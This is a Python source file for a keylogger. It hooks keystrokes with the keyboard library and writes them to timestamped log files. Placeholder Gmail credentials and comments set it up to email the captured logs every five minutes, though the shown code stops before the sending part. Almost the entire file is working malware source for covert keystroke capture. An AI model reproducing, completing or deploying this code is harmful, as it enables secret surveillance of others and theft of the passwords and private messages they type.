import smtplib # for sending email using SMTP protocol (gmail)
import keyboard 
from threading import Timer # Timer is to make a method runs after an `interval` amount of time
from datetime import datetime

# Less secure app access is on (we need to enable it because we will log in using smtplib in Python).
# 2-Step Verification is off.

SEND_REPORT_EVERY = 300 # in seconds, 300 means 5 minute and so on
EMAIL_ADDRESS = "thisisyourgmail@gmail.com"
EMAIL_PASSWORD = "thisisyourpassword"
# You need to input correct gmail credentials, otherwise reporting via SMTP-email will not work. Do double check the password that you are putting there.

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":  # " " == "space" (or a spacebar press)
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_") # replace spaces with underscores
                name = f"[{name.upper()}]"        
        self.log = self.log +  name
        
    def update_filename(self):
        start_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_str}_{end_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:  # opens the required file in Write mode (or creates it)
            print(self.log, file=f)                   # write the keylogs to the file
        print(f"[+=] Saved {self.filename}.txt")
        
    

